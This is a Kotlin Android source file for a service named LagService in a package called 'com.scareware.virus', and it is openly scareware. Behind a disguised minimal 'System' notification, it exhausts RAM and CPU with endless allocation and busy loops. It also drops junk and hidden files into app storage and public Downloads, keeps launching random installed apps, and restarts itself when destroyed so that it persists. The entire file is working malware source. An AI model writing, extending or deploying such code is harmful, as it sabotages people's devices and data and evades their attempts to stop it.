package com.scareware.virus

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class LagService : Service() {

    private val running = AtomicBoolean(true)
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newCachedThreadPool()
    private val ramChunks = mutableListOf<ByteArray>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(99, buildNotification())
        startRamAttack()
        startJunkFiles()
        startRandomAppOpener()
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val channelId = "sys"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System")
            .setContentText("...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun startRamAttack() {
        executor.execute {
            while (running.get()) {
                try {
                    val chunk = ByteArray(10 * 1024 * 1024) // 10MB
                    for (i in chunk.indices step 4096) chunk[i] = 1
                    synchronized(ramChunks) {
                        ramChunks.add(chunk)
                        if (ramChunks.size > 45) ramChunks.removeAt(0)
                    }
                } catch (oom: OutOfMemoryError) {
                    Thread.sleep(1200)
                }
                Thread.sleep(250)
            }
        }
        repeat(4) {
            executor.execute {
                var x = 0L
                while (running.get()) {
                    x = (x * 31 + 17) xor System.nanoTime()
                }
            }
        }
    }

    /** Create junk files in app private dir + public Downloads if possible */
    private fun startJunkFiles() {
        executor.execute {
            var n = 0
            while (running.get() && n < 80) {
                try {
                    // App private
                    val dir = File(filesDir, "cache_tmp")
                    if (!dir.exists()) dir.mkdirs()
                    val f = File(dir, "tmp_${System.currentTimeMillis()}_$n.dat")
                    f.writeBytes(ByteArray(512 * 1024) { Random.nextInt(256).toByte() }) // 512KB junk

                    // Try public Downloads
                    try {
                        val dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                        if (dl != null && dl.exists()) {
                            val jf = File(dl, ".sys_${n}_${System.currentTimeMillis()}.tmp")
                            jf.writeBytes(ByteArray(256 * 1024) { 0 })
                        }
                    } catch (_: Exception) {}

                    n++
                    Thread.sleep(800)
                } catch (_: Exception) {
                    Thread.sleep(1500)
                }
            }
        }
    }

    /** Open random apps very frequently */
    private fun startRandomAppOpener() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!running.get()) return
                tryOpenRandomApp()
                // Super fast: every 2.5 – 6 seconds
                handler.postDelayed(this, Random.nextLong(2500, 6000))
            }
        }, 3000)
    }

    private fun tryOpenRandomApp() {
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter {
                    (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 &&
                            it.packageName != packageName
                }
            if (apps.isEmpty()) return
            val target = apps[Random.nextInt(apps.size)]
            val launch = pm.getLaunchIntentForPackage(target.packageName) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(launch)
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        running.set(false)
        val restart = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart)
        else startService(restart)
        super.onDestroy()
    }
}
